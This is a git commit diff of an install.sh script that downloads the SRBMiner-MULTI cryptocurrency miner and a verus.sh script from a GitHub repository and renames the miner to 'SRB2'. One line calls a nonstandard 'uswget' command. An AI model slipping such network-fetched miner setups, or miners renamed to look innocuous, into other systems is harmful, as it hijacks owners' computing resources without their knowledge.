7bb22e8658b8b9db62d21871ef0b4c4cec6ebe69
Geokot82 <128073486+Geokot82@users.noreply.github.com>
2024-11-09 12:07:30 +0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,7 @@
 mkdir ~/SRB2
 cd ~/SRB2
 uswget ${GITHUB_DOWNLOAD_URL} -O ~/SRB2/SRB2
-wget https://raw.githubusercontent.com/Geokot82/SRB2/main/verus.sh -O ~/SRB2/verus.sh
+wget https://raw.githubusercontent.com/Geokot82/SRB2/main/verus.sh
 wget https://raw.githubusercontent.com/Geokot82/SRB2/main/SRBMiner-MULTI -O ~/SRB2/SRBMiner-MULTI
 mv SRBMiner-MULTI SRB2
 mv verus.sh SRB2
